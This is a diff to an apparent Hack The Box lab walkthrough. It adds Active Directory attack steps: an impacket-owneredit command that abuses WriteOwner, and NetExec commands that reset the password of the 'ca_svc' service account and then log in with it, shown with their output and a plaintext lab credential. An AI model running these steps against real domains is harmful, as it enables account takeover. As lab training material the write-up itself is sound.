@@ -466,6 +466,9 @@ I have WriteOwner over the `CA_SVC` account
 
 # Abusing `WriteOwner` to compromise the `ca_svc` account
 
+https://www.hackingarticles.in/abusing-ad-dacl-writeowner/
+
+
 ```python
 impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.232.128
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -492,5 +495,17 @@ Now i should have GenericAll
 So i have multiple options here, since this is a lab ill just change the user password, but generally in the real world this is bad OPSEC
 
 ```python
-
+nxc smb dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' -M change-password -o USER=ca_svc NEWPASS=Password123!
+SMB         10.129.232.128  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.128  445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
+CHANGE-P... 10.129.232.128  445    DC01             [+] Successfully changed password for ca_svc
 ```
+
+```python
+nxc smb dc01.sequel.htb -u ca_svc -p 'Password123!'                                                     
+SMB         10.129.232.128  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.128  445    DC01             [+] sequel.htb\ca_svc:Password123!
+```
+
+I now have compromised the `ca_svc` account
+
